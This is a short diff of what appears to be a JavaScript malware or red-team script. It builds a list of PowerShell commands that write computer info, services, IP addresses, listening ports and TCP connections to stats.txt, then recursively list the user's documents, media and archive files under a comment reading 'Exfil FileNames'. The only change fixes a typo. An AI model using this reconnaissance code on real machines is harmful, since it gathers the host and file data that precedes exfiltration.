@@ -18,7 +18,7 @@ let script = [
 	"Get-Computerinfo >> stats.txt;", //ComputerInfo
 	"Get-Service >> stats.txt;", // Get runing services 
 	"Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;", //Check all IPV4 sufix that is not localhost
-	"GEt-NetTCPConnection | Where-Object -Property State -Match Listen >> stats.txt;", //List listening ports	
+	"Get-NetTCPConnection | Where-Object -Property State -Match Listen >> stats.txt;", //List listening ports	
 	"Get-NetTCPConnection | Select-Object -Property * >> stats.txt;", // Get TCP information, ports, state etc..
 	"Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse >> stats.txt",//Exfil FileNames
 ];
